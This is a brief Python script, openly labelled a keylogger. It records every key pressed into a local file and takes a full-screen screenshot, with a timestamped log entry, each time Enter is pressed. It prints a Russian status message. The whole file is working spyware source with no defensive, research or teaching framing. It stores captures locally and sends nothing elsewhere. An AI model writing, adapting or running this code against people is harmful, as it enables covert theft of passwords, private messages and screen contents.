import keyboard
from PIL import ImageGrab
import datetime


def keylogger():
    text = ''
    with open("logs.txt", "a") as file:
        file.write("Start session\n")
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            text += event.name
            print(text)
            with open(f"message", "w") as file:
                file.write(text)


def take_screenshot():
    screenshot = ImageGrab.grab()
    current_time = datetime.datetime.now()
    screenshot.save(f"screenshot.png")
    print(current_time)
    print("Скриншот сохранен")


def on_key(event):
    current_time = str(datetime.datetime.now())
    if event.name == "enter":
        take_screenshot()
        with open("logs.txt", "a") as file:
            file.write(current_time)
            file.write(f" Screenshot Save\n")

keyboard.on_press(on_key)


if __name__ == '__main__':
    keylogger()
